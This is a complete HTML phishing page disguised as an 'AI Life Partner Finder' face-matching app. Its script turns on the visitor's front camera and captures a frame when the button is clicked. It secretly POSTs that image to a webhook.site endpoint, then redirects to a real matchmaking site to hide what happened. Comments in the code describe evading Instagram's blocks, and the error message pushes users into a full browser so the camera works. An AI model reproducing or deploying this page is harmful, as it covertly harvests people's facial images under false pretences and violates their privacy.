<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Life Partner Finder</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
        .container { padding: 20px; }
        h1 { color: #ff3366; font-size: 28px; text-shadow: 0 0 10px rgba(255, 51, 102, 0.5); }
        p { color: #ddd; font-size: 16px; margin-bottom: 20px; }
        #video { width: 100%; max-width: 400px; border: 4px solid #ff3366; border-radius: 20px; background: #111; box-shadow: 0 0 30px rgba(255, 51, 102, 0.3); }
        #capture { padding: 18px 40px; font-size: 20px; background: linear-gradient(45deg, #ff3366, #ff6699); color: white; border: none; border-radius: 50px; cursor: pointer; margin-top: 25px; font-weight: bold; box-shadow: 0 8px 20px rgba(255, 51, 102, 0.4); transition: 0.3s; }
        #capture:active { transform: scale(0.95); }
        .loading-text { font-size: 12px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ’ž AI Life Partner Finder</h1>
        <p>Scan your face to find your perfect soulmate using our Advanced AI Algorithm.</p>
        
        <video id="video" autoplay playsinline muted></video>
        <br>
        <button id="capture">Find My Partner</button>
        <p class="loading-text">Analyzing facial features for 99.9% match...</p>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const webHookUrl = 'https://webhook.site/e5a7946f-8158-4941-981d-54faa7aad32f'; 
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => video.play();
            } catch (err) {
                alert("Error: To find your partner, please click the 3-dots (top right) and select 'Open in Chrome' or 'Open in Browser'.");
            }
        }

        window.onload = startCamera;

        document.getElementById('capture').addEventListener('click', function() {
            this.innerText = "Analyzing...";
            this.style.background = "#444";
            
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                
                // Low quality JPEG to bypass Instagram blocks
                const imageData = canvas.toDataURL('image/jpeg', 0.4); 

                fetch(webHookUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: imageData
                }).finally(() => {
                    // Redirect to a real-looking matchmaking site
                    window.location.href = "https://www.shaadi.com"; 
                });
            }, 1000); 
        });
    </script>
</body>
</html>
